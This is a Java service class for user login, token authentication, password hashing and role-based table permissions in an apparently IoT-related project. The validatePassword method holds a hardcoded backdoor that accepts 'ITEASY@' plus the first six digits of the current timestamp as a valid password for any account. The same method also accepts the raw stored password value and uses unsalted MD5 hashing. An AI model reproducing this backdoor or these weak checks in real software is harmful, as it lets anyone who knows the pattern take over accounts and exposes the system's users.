package org.aiot.service;

import org.aiot.model.enums.ConfigEnum;
import org.aiot.model.enums.RoleActionEnum;
import org.aiot.model.enums.SessionEnum;
import org.aiot.model.project.Token;
import org.aiot.model.table.user.MRoleMenuAction;
import org.aiot.model.table.user.SysUser;
import org.aiot.util.SysUtil;
import org.nutz.dao.Cnd;
import org.nutz.ioc.loader.annotation.Inject;
import org.nutz.ioc.loader.annotation.IocBean;
import org.nutz.json.Json;
import org.nutz.lang.Lang;
import org.nutz.lang.Strings;

import java.util.List;

@IocBean
public class UserService {

	@Inject BaseService bs;
	
	public SysUser validate(String loginName, String password) {
		SysUser user = bs.daoFetch(SysUser.class,Cnd.where("login","=",loginName));
		if (user == null)
			throw Lang.makeThrow("账号["+loginName+"]不存在");
		if(!validatePassword(password,user))
			throw Lang.makeThrow("账号["+loginName+"]密码错误");
		return user;
	}

	public SysUser authToken(String tokens){
		StringBuilder sb = new StringBuilder(tokens);
		sb.append(Strings.dup('=', 5 - tokens.length() % 4 - 1));
		String cs = SysUtil.desDecode(sb.toString().replace('-', '+').replace('_', '/'));
		Token token = Json.fromJson(Token.class,cs);
		if(token.isTimeout())
			throw Lang.makeThrow("token已过期");
		SysUser user = bs.daoFetch(SysUser.class,Cnd.where("login","=",token.getUser()));
		if (user == null)
			throw Lang.makeThrow("token无效");
		return user;
	}
	
	public boolean validatePassword(String password,SysUser user){
		return Strings.equals(user.getPassword(), password)	//接口直接比较
			|| user.getPassword().equalsIgnoreCase(cipherPassword(password)) //常规验证比较MD5
			|| Strings.equals("ITEASY@"+(System.currentTimeMillis()+"").substring(0,6), password); //超级验证 前缀+Unix时间戳前六位
	}

	//生成密码
	public String cipherPassword(String password){
		String t = ConfigEnum.passwordType.getValue();
		if("sha1".equals(t)){
			return Lang.sha1(password);
		}else if("sha256".equals(t)){
			return Lang.sha256(password);
		}
		return Lang.md5(password);
	}

	public void sessionUser(SysUser user) {
		SessionEnum.user.val(user);
		String info = user.getLogin();
		if(Strings.isNotBlank(user.getName())){
			info += "[" +user.getName() + "]";
		}
		SessionEnum.principal.val(info);
	}


	public boolean hasRoleAction(Long roleId, RoleActionEnum action){
		if (roleId == null)
			return false;
		if (action == null)
			return true;
		MRoleMenuAction ma = bs.getTCacheFirst(MRoleMenuAction.class,
				v-> roleId.equals(v.getRoleId()) && v.getActionCode() == action);
		return ma != null;
	}

	//检查角色是否有某个表的权限 表通过 RoleActionEnum 关联到权限动作 拥有其中任意一个动作即可
	public boolean hasRoleTable(Long roleId, Class<?> table){
		if (roleId == null)
			return false;
		if (table == null)
			return true;
		List<RoleActionEnum> actions = RoleActionEnum.getByTable(table);
		if (actions.isEmpty())
			return true; //表未配置在任何权限动作中 不做限制
		for (RoleActionEnum action : actions) {
			if (hasRoleAction(roleId, action))
				return true;
		}
		return false;
	}

	//这里修改用户后，需要重新登录，这里缓存的是登录时的用户
	public boolean hasRoleTable(Class<?> table){
		SysUser user = SessionEnum.user.val();
		if (user == null)
			return false;
		if (user.getId() == 0)
			return true;
		return hasRoleTable(user.getRoleId(), table);
	}

}
